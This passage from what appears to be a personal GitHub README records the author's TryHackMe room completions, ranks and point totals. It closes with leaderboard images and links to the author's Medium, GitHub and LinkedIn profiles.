|7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
|7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
|7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
|6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
|6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
|6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
|6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
|5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
|5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
|4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
|4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	    5ᵗʰ     |     579ᵗʰ     |    10ᵗʰ    | 124,018  |   940     |    73     |
|3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
|2       |Medium 🔗 - Session Forensics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
|1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   107ᵗʰ<br><img width="250px"  src="https://github.com/user-attachments/assets/8962ee09-d14d-4fc3-a3c9-90b39fecd493"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/30f25b1a-888d-4d40-aa20-b91d058d56cd"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b90cf33f-15b9-4459-a53f-064a1bbb919f"><br>
                  Global monthly:    364ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/5634f5b3-e659-4c2e-87b4-7cd81c65064d"><br>
                  Brazil monthly:      7ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/cc5af2c0-d858-4501-8e4b-963fb9be6074"><br>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
